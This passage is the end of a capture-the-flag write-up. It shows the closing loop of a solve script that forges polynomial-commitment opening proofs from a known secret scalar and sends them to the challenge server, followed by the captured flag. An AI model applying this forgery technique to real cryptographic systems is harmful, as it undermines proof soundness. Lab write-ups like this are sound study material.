        y = (y + 1) % o

    denom = (alpha - z) % o
    if denom == 0:
        raise ValueError("Bad luck: z == alpha mod o")

    w_scalar = ((c_scalar - y) * inverse_mod(denom, o)) % o

    if w_scalar == 0:
        y = (y + 1) % o
        w_scalar = ((c_scalar - y) * inverse_mod(denom, o)) % o
        if w_scalar == 0:
            raise ValueError("Unexpected zero witness scalar twice")

    Pi = w_scalar * true_G1_E
    if Pi == E(0):
        raise ValueError("Witness point is infinity")

    io.sendline(str(Integer(y)).encode())
    io.sendline(f"{Integer(Pi[0])},{Integer(Pi[1])}".encode())

    if (rnd + 1) % 10 == 0:
        log.info(f"Answered {rnd + 1}/100 openings")

io.interactive()
```

![challenge-screenshot](toxic.png#center)

`flag{Alph4_h4s_t0_b3_1nc1n3r4t3d_947a1a1e8895d3d483ab}`

---

The rest of the challenges were either solved by my teammate or completely by ChatGPT so that was it for this writeup. Thank you for reading until the end, and I'm glad if this can be of any help to anyone.
